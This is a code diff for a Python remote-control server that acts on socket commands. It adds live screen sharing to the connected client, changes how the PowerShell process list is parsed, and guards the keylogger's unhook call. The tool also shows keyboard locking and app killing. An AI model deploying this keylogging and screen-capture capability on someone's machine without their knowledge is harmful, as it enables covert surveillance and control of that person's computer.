@@ -14,6 +14,8 @@ import csv
 import codecs
 import sys
 import time
+import re
+import stream
 class Server(object):
     def main_form(self):
         """Creates the interface window"""
@@ -68,6 +70,11 @@ class Server(object):
             mac_out = subprocess.check_output(['getmac', '/v','/fo','list'])
             self.conn.sendall(mac_out)
             self.conn.send('STOPRIGHTNOW'.encode())
+        elif Str.decode()=="SHARE_SCREEN":
+            sender=stream.StreamingSender(conn=self.conn,addr=self.target_addr)
+            sender_thread=threading.Thread(target=sender.start_stream)
+            sender_thread.start()
+            pass
         elif Str.decode().find('LOCKKEYBOARD') != -1:
             tmp = Str.decode().split(' ')
             for i in range(180):
@@ -112,9 +119,20 @@ class Server(object):
         elif Str.decode() == 'SHWPRCAPP':
             tmp = subprocess.check_output("powershell gps | where {$_.MainWindowTitle} | select Name,Id,@{Name='ThreadCount';Expression={$_.Threads.Count}}")
             arr = tmp.decode('utf-8').split()[6:]
-            print(arr)
-            for i in range(0,len(arr)//3):
-                plusStr=str(arr[3*i]+' '+arr[3*i+1]+' '+arr[3*i+2]+' ')
+            newArr = []
+            ind = 0
+            while ind < len(arr):
+                baseStr = ""
+                while re.search('[a-zA-Z]', arr[ind]):
+                    baseStr += arr[ind]
+                    ind+=1
+                if len(baseStr) != 0:
+                    newArr.append(baseStr)
+                newArr.append(arr[ind])
+                ind += 1
+            print(newArr)
+            for i in range(0,len(newArr)//3):
+                plusStr=str(newArr[3*i]+' '+newArr[3*i+1]+' '+newArr[3*i+2]+' ')
                 self.conn.send(plusStr.encode())
             self.conn.send('STOPRIGHTNOW'.encode())
         elif Str.decode().find('KILLAPP') != -1:
@@ -239,7 +257,10 @@ class Server(object):
         keyboard.wait()
     #TODO: Unhook
     def stopKeylogging(self):
-        keyboard.unhook(self.__callback)
+        try:
+            keyboard.unhook(self.__callback)
+        except:
+            pass
     def Close(self):
         s.close()
         close_it=threading.Thread(target=self.root.destroy,daemon=True)
